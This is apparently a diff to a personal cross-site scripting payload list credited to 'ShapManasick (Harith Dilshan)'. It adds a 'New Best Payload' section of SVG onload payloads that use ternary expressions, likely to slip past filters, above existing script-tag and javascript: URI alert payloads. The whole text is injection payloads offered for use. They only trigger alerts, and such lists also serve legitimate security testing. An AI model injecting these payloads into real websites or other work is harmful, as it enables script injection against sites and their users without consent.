@@ -1,5 +1,11 @@
 ﻿===By ShapManasick (Harith Dilshan)===
 
+==New Best Payload==
+<svg onload=1?alert(9):0>
+<svg onload=0?1:alert(9)>
+====================
+
+
 <script>alert(123)</script>
 <script>alert("hellox worldss");</script>
 javascript:alert("hellox worldss")
